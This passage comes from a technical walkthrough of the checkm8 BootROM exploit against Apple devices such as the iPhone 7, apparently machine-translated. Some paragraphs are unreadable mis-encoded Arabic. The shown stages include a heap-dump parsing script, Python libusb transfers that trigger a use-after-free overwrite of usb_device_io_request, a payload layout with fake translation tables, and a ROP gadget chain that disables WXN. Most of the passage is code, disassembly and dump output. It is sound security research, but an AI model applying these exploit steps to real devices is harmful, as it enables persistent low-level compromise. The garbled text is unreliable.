<span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููููู ุงูุชุญูู ูู ุตุญุฉ ูุฐู ุงูุงุณุชูุชุงุฌุงุช ูู ุฎูุงู ุชุญููู ุงููุถุน ุงูุญุงูู <code>SecureRAM</code> ูููุฉ <code>SecureRAM</code> ุ ูุงูุชู ุญุตููุง ุนูููุง ูุน <code>checkm8</code> .  ููุฐุง ุงูุบุฑุถ ุ ูุชุจูุง ูุตูุง ุจุณูุทูุง ูููู ุจุชูุฑูุบ ููุฏุณ ุงูุฐุงูุฑุฉ ุงููุคูุชุฉ ููููู ุจุชุนุฏุงุฏ ุงูุฃุฌุฒุงุก.  ุถุน ูู ุงุนุชุจุงุฑู ุฃูู ุฃุซูุงุก ุชุฌุงูุฒ ุณุนุฉ <code>usb_device_io_request</code> ุ ูุงู ุฌุฒุกูุง ูู ุงูุจูุงูุงุช ุงูุชุนุฑูููุฉ ุชุงูููุง ุ ูุฐูู <code>usb_device_io_request</code> ุฃุซูุงุก ุงูุชุญููู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): # skipping damaged chunks this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูููู ุงูุนุซูุฑ ุนูู ุฅุฎุฑุงุฌ ุงูุจุฑูุงูุฌ ุงููุตู ูุน ุงูุชุนูููุงุช ุชุญุช ุงูููุณุฏ.  ููููู ุฃู ุชุฑู ุฃู ูุญุฏุงุช ุงูุจุงูุช ุฐุงุช ุงูุชุฑุชูุจ ุงูููุฎูุถ ุชุทุงุจู ูุชุงุฆุฌ ุงููุญุงูุงุฉ. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุชูุฌุฉ ุชุญููู ุงููููุฉ ูู SecureRAM</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p style=";text-align:right;direction:rtl"> You can also achieve an interesting effect by overflowing the configuration descriptors <code>High Speed</code> and <code>Full Speed</code> that are located right after the <code>IO</code> buffer. One of the fields of a configuration descriptor is responsible for its overall length. By overflowing this field, we can read beyond the descriptor. You can try and do it yourself by modifying the exploit. </p><br><h2 id="2-allocation-and-freeing-of-the-io-buffer-without-clearing-the-global-state" style=";text-align:right;direction:rtl"> 2. Allocation and freeing of the IO buffer without clearing the global state </h2><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p style=";text-align:right;direction:rtl"> At this stage, an incomplete <code>OUT</code> request for uploading the image is created. At the same time, a global state is initialized, and the address of the buffer in the heap is written to the <code>io_buffer</code> . Then, <code>DFU</code> is reset with a <code>DFU_CLR_STATUS</code> request, and a new iteration of <code>DFU</code> begins. </p><br><h2 id="3-overwriting-usb_device_io_request-in-the-heap-with-use-after-free" style=";text-align:right;direction:rtl"> 3. Overwriting <code>usb_device_io_request</code> in the heap with <code>use-after-free</code> </h2><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p style=";text-align:right;direction:rtl"> At this stage, a <code>usb_device_io_request</code> type object is allocated in the heap, and it is overflown with <code>t8010_overwrite</code> , whose content was defined at the first stage. </p><br><p style=";text-align:right;direction:rtl"> The values of <code>t8010_nop_gadget</code> and <code>0x1800B0800</code> should overflow the fields <code>callback</code> and <code>next</code> of the <code>usb_device_io_request</code> structure. </p><br><p style=";text-align:right;direction:rtl"> <code>t8010_nop_gadget</code> is shown below and conforms to its name, but besides function return, the previous <code>LR</code> register is restored, and because of that the call <code>free</code> is skipped after the <code>callback</code> function in <code>usb_core_complete_endpoint_io</code> . This is important, because we damage the heap's metadata due to overflow, which would affect the exploit in case of a freeing attempt. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> <code>next</code> points to <code>INSECURE_MEMORY + 0x800</code> . Later, <code>INSECURE_MEMORY</code> will store the exploit's payload, and at the offset of <code>0x800</code> in the payload, there is a <code>callback-chain</code> , which we'll discuss later on. </p><br><h2 id="4-placing-the-payload" style=";text-align:right;direction:rtl"> 4. Placing the payload </h2><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p style=";text-align:right;direction:rtl"> At this stage, every following packet is put into the memory area allocated for the image. The payload looks like this: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">0x1800B0000: t8010_shellcode # initializing shell-code ... 0x1800B0180: t8010_handler # new usb request handler ... 0x1800B0400: 0x1000006a5 # fake translation table descriptor # corresponds to SecureROM (0x100000000 -&gt; 0x100000000) # matches the value in the original translation table ... 0x1800B0600: 0x60000180000625 # fake translation table descriptor # corresponds to SecureRAM (0x180000000 -&gt; 0x180000000) # matches the value in the original translation table 0x1800B0608: 0x1800006a5 # fake translation table descriptor # new value translates 0x182000000 into 0x180000000 # plus, in this descriptor,there are rights for code execution 0x1800B0610: disabe_wxn_arm64 # code for disabling WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-execution-of-callback-chain" style=";text-align:right;direction:rtl"> 5. Execution of <code>callback-chain</code> </h2><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p style=";text-align:right;direction:rtl"> After <code>USB</code> reset, the loop of canceling incomplete <code>usb_device_io_request</code> in the queue by going through a linked list is started. In the previous stages, we replaced the rest of the queue, which allows us to control the <code>callback</code> chain. To build this chain, we use this gadget: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18โj bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48โj bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p style=";text-align:right;direction:rtl"> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">uEmu</a> . </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p style=";text-align:right;direction:rtl"> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600" style=";text-align:right;direction:rtl"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb" style=";text-align:right;direction:rtl"> 5.2. <code>dmb</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 id="53-enter_critical_section" style=";text-align:right;direction:rtl"> 5.3. <code>enter_critical_section()</code> </h4><br><p style=";text-align:right;direction:rtl"> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000" style=";text-align:right;direction:rtl"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi" style=";text-align:right;direction:rtl"> 5.5. <code>tlbi</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64" style=";text-align:right;direction:rtl"> 5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000" style=";text-align:right;direction:rtl"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p style=";text-align:right;direction:rtl"> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi" style=";text-align:right;direction:rtl"> 5.8. <code>tlbi</code> </h4><br><p style=";text-align:right;direction:rtl"> The translation table is reset again. </p><br><h4 id="59-exit_critical_section" style=";text-align:right;direction:rtl"> 5.9. <code>exit_critical_section()</code> </h4><br><p style=";text-align:right;direction:rtl"> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000" style=";text-align:right;direction:rtl"> 5.10. <code>0x1800B0000</code> </h4><br><p 